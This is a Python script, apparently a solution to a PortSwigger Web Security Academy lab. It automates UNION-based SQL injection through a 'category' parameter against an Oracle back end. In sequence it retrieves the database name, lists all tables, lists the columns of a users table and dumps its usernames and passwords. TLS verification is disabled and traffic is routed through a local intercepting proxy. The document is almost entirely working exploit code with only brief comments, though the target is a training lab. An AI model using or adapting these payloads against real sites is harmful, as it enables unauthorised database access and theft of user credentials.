
# SQL injection attack, listing the database contents on Oracle
# Vulnerability in category parameter
# Assumptions:
    # We know number of returned columns
    # We know data type returned columns

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = 'https://0aea003c0439d8fdc0121ae8004f00ba.web-security-academy.net/filter'


# Checking Current Database

payload = "' UNION SELECT global_name,NULL FROM global_name--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
db = bs.find_all('th')
print("[+] Current Database Name")
for d in db:
    print(f'-> {d.text}')


# Listing all table names

payload = "' UNION SELECT table_name,NULL FROM all_tables--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
tbs = bs.find_all('th')
print("\n[+] Available tables in current database")
for t in tbs:
    print(f'-> {t.text}')


# Listing columns in user table

payload = "' UNION SELECT column_name,NULL FROM all_tab_cols WHERE table_name='USERS_FFNCHO'--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
cols = bs.find_all('th')
print("\n[+] Available columns in USERS_FFNCHO table")
for c in cols:
    print(f'-> {c.text}')


# Dumping USERS_FFNCHO table

payload = "' UNION SELECT USERNAME_DKHBNW,PASSWORD_SAAFKB FROM USERS_FFNCHO--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False, proxies=proxy)
bs = BeautifulSoup(r.text, 'html.parser')
creds = bs.find_all('tr')
print("\n[+] USERS_FFNCHO table dump")
print("Username \tPassword")
for c in creds:
    print(f'{c.th.text} \t{c.td.text}')